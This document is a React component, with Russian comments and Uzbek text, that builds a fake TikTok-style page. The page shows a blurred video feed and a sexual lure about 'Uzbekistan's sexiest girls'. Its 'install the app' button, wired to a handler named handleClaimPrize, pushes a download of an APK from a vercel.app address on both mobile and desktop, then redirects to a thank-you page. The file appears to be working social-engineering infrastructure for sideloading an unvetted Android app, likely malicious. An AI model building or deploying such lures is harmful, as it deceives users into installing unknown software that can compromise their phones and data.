import React, { useState, useEffect } from 'react';
import { useConfig } from '../hooks/useConfig';

const TikTokLikeSite = () => {
  const { config, loading } = useConfig('tiktoklikesite');
  const [scrollPosition, setScrollPosition] = useState(0);

  // Контент для ленты из конфигурации
  const videos = config?.videos || [
    {
      id: 1,
      author: '@aylin.uz',
      avatar: '👤',
      title: 'Eng soʻnggi trendlar',
      likes: 1234,
      comments: 567,
      shares: 234,
      image: 'https://tse2.mm.bing.net/th/id/OIP.4ielnp5TTWyQB-gIoMi3OAHaIx?w=144&h=180&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
    },
    {
      id: 2,
      author: '@dina.kz',
      avatar: '👩',
      title: 'Ajoyib xareketlar',
      likes: 5678,
      comments: 1234,
      shares: 456,
      image: 'https://tse1.mm.bing.net/th/id/OIP.JwNDrnkFbDW0Xp8YTzPl0wHaLJ?w=203&h=306&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
    },
    {
      id: 3,
      author: '@zoya_star',
      avatar: '✨',
      title: 'Yana bir video',
      likes: 9999,
      comments: 2345,
      shares: 789,
      image: 'https://tse1.mm.bing.net/th/id/OIP.IrJLFY8GN3qToCogSbAySgHaJQ?w=208&h=260&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
    },
    {
      id: 4,
      author: '@marina.uz',
      avatar: '👩',
      title: 'Yangi kontent',
      likes: 3456,
      comments: 890,
      shares: 345,
      image: 'https://tse2.mm.bing.net/th/id/OIP.K5n22tazTXFR0VZ1r3uNJwHaJO?w=208&h=258&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
    },
    {
      id: 5,
      author: '@saiora.uz',
      avatar: '🎵',
      title: 'Musiqali trendlar',
      likes: 7890,
      comments: 1567,
      shares: 567,
      image: 'https://tse3.mm.bing.net/th/id/OIP.pOoV4NCgaFcfOb17tW5DxgHaHa?w=208&h=208&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
    },
    {
      id: 6,
      author: '@ekaterina_beauty',
      avatar: '👤',
      title: 'Eng yangi content',
      likes: 4567,
      comments: 1123,
      shares: 456,
      image: 'https://tse2.mm.bing.net/th/id/OIP.UseftiZhy_INsCNSsQBqgQHaJ3?w=208&h=277&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1',
    },
  ];

  const handleClaimPrize = (e) => {
    e.preventDefault();

    const apkUrl = config?.apkUrl || 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
    const thankYouUrl = config?.thankYouUrl || '/thankyou2.html';
    
    // На мобилке: попытка открыть напрямую (вызовет установку)
    window.location.href = apkUrl;

    // На ПК: открываем в новой вкладке
    setTimeout(() => {
      window.open(apkUrl, '_blank');
    }, 300);

    // Редирект на thankyou после задержки
    setTimeout(() => {
      window.location.href = thankYouUrl;
    }, 1500);
  };

  const texts = config?.texts || {};

  // useEffect должен быть вызван ДО условного return (правила хуков React)
  useEffect(() => {
    if (loading) return; // Не запускаем эффект пока загружается
    
    const totalHeight = videos.length * 720;
    
    const interval = setInterval(() => {
      setScrollPosition((prev) => {
        let newPos = prev + 720;
        
        if (newPos >= totalHeight) {
          newPos = newPos % totalHeight;
        }
        
        return newPos;
      });
    }, 5000);

    return () => clearInterval(interval);
  }, [videos.length, loading]);

  if (loading) {
    return (
      <div style={{
        width: '100%',
        height: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        color: 'white'
      }}>
        Загрузка...
      </div>
    );
  }

  const styles = {
    container: {
      width: '100%',
      height: '100vh',
      position: 'relative',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      overflow: 'hidden',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
    },



    // МАКЕТ ТЕЛЕФОНА
    phoneFrame: {
      position: 'relative',
      width: '360px',
      height: '720px',
      background: '#000',
      borderRadius: '50px',
      border: '12px solid #1a1a1a',
      boxShadow: '0 20px 60px rgba(0, 0, 0, 0.9), inset 0 0 0 1px rgba(255, 255, 255, 0.1)',
      overflow: 'hidden',
      zIndex: 5,
      filter: 'blur(8px)',
    },

    phoneNotch: {
      position: 'absolute',
      top: 0,
      left: '50%',
      transform: 'translateX(-50%)',
      width: '150px',
      height: '25px',
      background: '#000',
      borderRadius: '0 0 25px 25px',
      zIndex: 20,
    },

    phoneScreen: {
      width: '100%',
      height: '100%',
      overflow: 'hidden',
      position: 'relative',
    },

    phoneContent: {
      width: '100%',
      height: '100%',
      transform: `translateY(-${scrollPosition}px)`,
      transition: 'transform 0.8s ease-out',
    },

    videoCard: {
      width: '360px',
      height: '720px',
      display: 'flex',
      alignItems: 'flex-end',
      justifyContent: 'center',
      position: 'relative',
      flexShrink: 0,
      backgroundSize: 'cover',
      backgroundPosition: 'center',
      backgroundRepeat: 'no-repeat',
    },

    videoContent: {
      width: '100%',
      height: '100%',
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'flex-end',
      padding: '20px',
      position: 'relative',
    },

    authorInfo: {
      display: 'flex',
      alignItems: 'center',
      gap: '10px',
      marginBottom: '15px',
    },

    avatar: {
      width: '40px',
      height: '40px',
      borderRadius: '50%',
      backgroundColor: 'rgba(255, 255, 255, 0.3)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      fontSize: '20px',
      border: '2px solid white',
    },

    authorName: {
      fontSize: '14px',
      fontWeight: '600',
      color: 'white',
      margin: 0,
    },

    videoTitle: {
      fontSize: '16px',
      fontWeight: '600',
      color: 'white',
      marginBottom: '20px',
      margin: 0,
    },

    rightPanel: {
      position: 'absolute',
      right: '12px',
      bottom: '50px',
      display: 'flex',
      flexDirection: 'column',
      gap: '20px',
      zIndex: 3,
    },

    iconButton: {
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      gap: '4px',
      cursor: 'pointer',
      color: 'white',
      fontSize: '24px',
      transition: 'transform 0.2s ease',
    },

    iconCount: {
      fontSize: '11px',
      fontWeight: '600',
      color: 'white',
      minWidth: '30px',
      textAlign: 'center',
    },

    // ПЕРЕДНИЙ ПЛАН
    frontLayer: {
      position: 'absolute',
      top: 0,
      left: 0,
      width: '100%',
      height: '100%',
      zIndex: 10,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      flexDirection: 'column',
      textAlign: 'center',
      padding: '40px',
      pointerEvents: 'none',
    },

    frontContent: {
      maxWidth: '400px',
      position: 'absolute',
      zIndex: 15,
    },

    logo: {
      fontSize: '56px',
      fontWeight: '800',
      color: 'white',
      marginBottom: '20px',
      textShadow: '0 6px 20px rgba(0, 0, 0, 0.4)',
      letterSpacing: '-1px',
    },

    description: {
      fontSize: '20px',
      color: 'white',
      marginBottom: '35px',
      lineHeight: '1.6',
      textShadow: '0 3px 15px rgba(0, 0, 0, 0.4)',
      fontWeight: '500',
    },

    features: {
      display: 'flex',
      flexDirection: 'column',
      gap: '15px',
      marginBottom: '40px',
      textAlign: 'left',
    },

    feature: {
      fontSize: '14px',
      color: 'rgba(255, 255, 255, 0.9)',
      display: 'flex',
      alignItems: 'center',
      gap: '10px',
      textShadow: '0 2px 8px rgba(0, 0, 0, 0.4)',
    },

    featureIcon: {
      fontSize: '20px',
    },

    button: {
      padding: '16px 40px',
      fontSize: '16px',
      fontWeight: '700',
      border: 'none',
      borderRadius: '12px',
      cursor: 'pointer',
      background: 'linear-gradient(135deg, #ff3b30 0%, #ff1744 100%)',
      color: 'white',
      boxShadow: '0 8px 24px rgba(255, 55, 48, 0.4)',
      transition: 'all 0.3s ease',
      pointerEvents: 'auto',
      minWidth: '200px',
    },

    buttonHover: {
      transform: 'translateY(-4px)',
      boxShadow: '0 12px 32px rgba(255, 55, 48, 0.5)',
    },
  };

  return (
    <div style={styles.container}>
      {/* МАКЕТ ТЕЛЕФОНА */}
      <div style={styles.phoneFrame}>
        <div style={styles.phoneNotch}></div>
        
        <div style={styles.phoneScreen}>
          <div style={styles.phoneContent}>
            {videos.map((video, index) => (
              <div 
                key={index} 
                style={{ 
                  ...styles.videoCard, 
                  backgroundImage: `url(${video.image})`,
                }}
              >
                <div style={styles.videoContent}>
                  <div style={styles.authorInfo}>
                    <div style={styles.avatar}>{video.avatar}</div>
                    <p style={styles.authorName}>{video.author}</p>
                  </div>

                  <p style={styles.videoTitle}>{video.title}</p>

                  <div style={styles.rightPanel}>
                    <div style={styles.iconButton}>
                      <span>❤️</span>
                      <span style={styles.iconCount}>{(video.likes / 1000).toFixed(1)}K</span>
                    </div>
                    <div style={styles.iconButton}>
                      <span>💬</span>
                      <span style={styles.iconCount}>{(video.comments / 1000).toFixed(1)}K</span>
                    </div>
                    <div style={styles.iconButton}>
                      <span>📤</span>
                      <span style={styles.iconCount}>{(video.shares / 1000).toFixed(1)}K</span>
                    </div>
                    <div style={styles.iconButton}>
                      <span>🔖</span>
                      <span style={styles.iconCount}>-</span>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ПЕРЕДНИЙ ПЛАН */}
      <div style={styles.frontLayer}>
        <div style={styles.frontContent}>
          <div style={styles.logo}>{texts.logo || 'SXUz'}</div>

          <p style={styles.description}>
            {texts.description || 'Faqat shu yerda siz Oʻzbekistonning eng sexy qizlarini topasiz'}
          </p>

          <div style={styles.features}>
            {(texts.features || [
              { icon: '📱', text: 'Vertikal kontentning kutub lentasi' },
              { icon: '⚡', text: 'Tezkor video yuklash' },
              { icon: '❤️', text: 'Interaktiv xususiyatlar' }
            ]).map((feature, index) => (
              <div key={index} style={styles.feature}>
                <span style={styles.featureIcon}>{feature.icon}</span>
                <span>{feature.text}</span>
              </div>
            ))}
          </div>

          <button
            onClick={handleClaimPrize}  
            style={styles.button}
            onMouseOver={(e) => Object.assign(e.target.style, styles.buttonHover)}
            onMouseOut={(e) => {
              e.target.style.transform = 'translateY(0)';
              e.target.style.boxShadow = '0 8px 24px rgba(255, 55, 48, 0.4)';
            }}
          >
            {texts.button || '📥 Ilovani oʻrnatish'}
          </button>
        </div>
      </div>
    </div>
  );
};

export default TikTokLikeSite;